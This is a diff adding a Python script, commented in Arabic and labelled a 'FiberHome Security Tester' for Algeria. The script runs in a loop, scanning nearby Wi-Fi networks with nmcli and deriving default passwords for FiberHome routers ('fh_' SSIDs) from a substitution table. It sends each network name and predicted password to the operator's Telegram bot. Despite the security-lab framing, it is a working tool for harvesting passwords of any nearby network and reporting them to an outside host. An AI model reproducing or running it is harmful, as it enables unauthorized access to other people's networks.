@@ -1,0 +1,101 @@
+# -*- coding: utf-8 -*-
+import os
+import subprocess
+import requests
+import time
+import re
+
+# ============================================================
+# [إعدادات التلجرام - ضع بياناتك هنا]
+# ============================================================
+BOT_TOKEN = "ضع_التوكن_هنا"
+CHAT_ID = "ضع_الايدي_هنا"
+
+# ============================================================
+# [جدول التبديل الخاص بمودمات FiberHome في الجزائر]
+# بناءً على الصورة التي أرفقتها (wlan + التحويل)
+# ============================================================
+MAPPING = {
+    'e': '1', 'd': '2', '3': 'c', 'b': '4',
+    'a': '5', '9': '6', '8': '7', 'f': '0'
+}
+
+def send_telegram(msg):
+    """إرسال النتيجة إلى هاتفك عبر تلجرام"""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, data=payload)
+    except:
+        pass
+
+def predict_fh_password(ssid):
+    """تطبيق الخوارزمية: تحويل ما بعد fh_ وإضافة بادئة wlan"""
+    target = ssid.lower()
+    if "fh_" in target:
+        # استخراج الجزء الذي يلي fh_
+        parts = target.split("fh_")
+        suffix = parts[1]
+        
+        # عملية التبديل بناءً على الجدول
+        transformed = ""
+        for char in suffix:
+            transformed += MAPPING.get(char, char)
+            
+        return f"wlan{transformed}"
+    return None
+
+def scan_wifi_networks():
+    """مسح الشبكات القريبة باستخدام أداة nmcli (نظام لينكس)"""
+    networks = []
+    try:
+        # تنفيذ أمر المسح وجلب الأسماء (SSID)
+        result = subprocess.check_output("nmcli -t -f SSID device wifi list", shell=True).decode("utf-8")
+        for line in result.split('\n'):
+            if line.strip():
+                networks.append(line.strip())
+    except Exception as e:
+        print(f"[-] Error Scanning: {e}")
+    return list(set(networks)) # إزالة التكرار
+
+def main():
+    print("--------------------------------------------------")
+    print("   FiberHome (FH) Security Tester - Algeria       ")
+    print("   Coded for: Moha (Security Lab)                 ")
+    print("--------------------------------------------------")
+    
+    # قائمة لتتبع الشبكات التي تم فحصها وإرسالها لتجنب التكرار
+    history = []
+    
+    while True:
+        print("\n[*] Scanning for nearby networks...")
+        ssids = scan_wifi_networks()
+        
+        for name in ssids:
+            if "fh_" in name.lower() and name not in history:
+                print(f"[!] Detected Target: {name}")
+                predicted_pass = predict_fh_password(name)
+                
+                if predicted_pass:
+                    # تحضير الرسالة
+                    log_msg = (
+                        "🔴 *FH Security Alert*\n\n"
+                        f"📡 *SSID:* `{name}`\n"
+                        f"🔑 *Suggested Pass:* `{predicted_pass}`\n\n"
+                        "⚠️ *Note:* If this is your network, please change the password immediately!"
+                    )
+                    
+                    # الإرسال لتلجرام والطباعة في الشاشة
+                    print(f"[+] Predicted Password: {predicted_pass}")
+                    send_telegram(log_msg)
+                    history.append(name)
+        
+        # الانتظار لمدة 30 ثانية قبل المسح التالي
+        time.sleep(30)
+
+if __name__ == "__main__":
+    # تنبيه قبل التشغيل
+    if BOT_TOKEN == "ضع_التوكن_هنا":
+        print("[!] Warning: Please set your Telegram Token/ID first.")
+    
+    main()
